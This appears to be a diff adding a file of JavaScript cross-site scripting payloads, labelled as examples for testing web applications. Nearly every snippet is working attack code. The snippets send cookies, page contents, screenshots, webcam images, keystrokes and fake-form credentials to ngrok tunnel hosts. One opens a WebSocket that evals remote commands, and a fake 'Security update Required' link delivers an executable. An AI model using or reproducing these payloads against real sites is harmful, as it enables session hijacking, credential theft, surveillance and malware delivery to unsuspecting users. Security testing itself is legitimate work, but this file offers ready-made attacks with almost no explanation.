@@ -1,0 +1,109 @@
+//XSS Examples to testing in your webapplication 
+
+//Redirecting the address
+    window.location="https://example.com"
+
+//Iframe of Youtube video in my page current
+    document.body.innerHTML="<iframe src=https://www.youtube.com/embed/d84SP5r6n9c?autoplay=1allow=autoplay></iframe>"
+
+//Catch cookies in a browser
+    fetch(`https://c784-2804-14d-14a0-92e0-50d8-589a-9845-22a3.ngrok.io?cookie=${encodeURIComponent(document.cookie)}`)
+
+//Catch all page to route 
+    fetch('/account')
+        .then(p => p.text())
+        .then(t => 
+             fetch('https://c784-2804-14d-14a0-92e0-50d8-589a-9845-22a3.ngrok.io', {
+                 method: 'POST',
+                 headers: { 'Content-Type': 'application/json'},
+                 body: JSON.stringify({p:t})
+             })
+        )
+
+//Throught websocket server to control page
+s = new WebSocket('wss://1ad0-2804-14d-14a0-92e0-50d8-589a-9845-22a3.ngrok.io')
+s.onmessage = e => eval(e.data)
+
+//Stolen Text Content of a element in DOM
+ fetch('https://5dfe-2804-14d-14a0-92e0-50d8-589a-9845-22a3.ngrok.io?data='+
+  encodeURIComponent(document.querySelector('.present-div-class').textContent)))
+
+//Screenshots in a page
+<script src=https://html2canvas.hertzen.com/dist/html2canvas.min.js></script>
+<script>
+    html2canvas(document.body)
+        .then(c => 
+            fetch('https://5dfe-2804-14d-14a0-92e0-50d8-589a-9845-22a3.ngrok.io', {
+                method: 'POST',
+                headers: { 'Content-type': 'application/json' },
+                body: JSON.stringify({img: c.toDataURL()})
+            }
+        ))
+</script>
+
+//Force automaticly download a document
+f=document.createElement('iframe')
+f.src = './important.docx'
+document.body.appendChild(f)
+
+//With a allow permisson of target in browser, catch a pic througth webcam
+v = document.createElement('video')
+navigator.mediaDevices.getUserMedia({video:true})
+    .then(stream => {
+        v.srcObject = stream
+        v.play()
+        setTimeout(() => {
+            c = document.createElement('canvas')
+            c.width = v.videoWidth
+            c.height = v.videoHeight
+            c.getContext('2d').drawImage(v,0,0)
+            fetch('https://2982-2804-14d-14a0-92e0-5888-4cb5-3eca-218e.ngrok.io', {
+                    method: 'POST',
+                    headers: { 'Content-type': 'application/json' },
+                    body: JSON.stringify({img: c.toDataURL()})
+            })
+        }, 2000)
+    })
+
+//Create a exe or other extension to download by user in page
+<a 
+    href=/update.exe 
+    download=update.exe 
+    onclick="if(window.el) { return;}
+    el=this;
+fetch('https://pbs.twimg.com/profile_images/1053827506946531330/SxDbKloF_400x400.jpg')
+    .then(resp => resp.blob())
+    .then(blob => {
+        el.href=window.URL.createObjectURL(blob)
+        el.click()
+    })
+    return false">
+    Security update Required
+    </a>
+
+//Create a input and catch this keylogger
+document.addEventListener('change', e=>{
+    if(!e.target.matches('input, textarea')) return fetch('https://2982-2804-14d-14a0-92e0-5888-4cb5-3eca-218e.ngrok.io', {
+                    method: 'POST',
+                    headers: { 'Content-type': 'application/json' },
+                    body: JSON.stringify({key: e.target.value})
+            })
+ })
+
+ //Stolen datas through simples inputs
+ f = document.createElement('form')
+
+ u = document.createElement('input')
+ u.setAttribute('type', 'text')
+ u.setAttribute('name', 'username')
+
+ p = document.createElement('input')
+ p.setAttribute('type', 'password')
+ p.setAttribute('name', 'password')
+
+ f.appendChild(u)
+ f.appendChild(p)
+
+ document.body.appendChild(f)
+ document.addEventListener('onclick', 
+ ()=> fetch(`https://2982-2804-14d-14a0-92e0-5888-4cb5-3eca-218e.ngrok.io?u=${u.value}&p=${p.value}`))
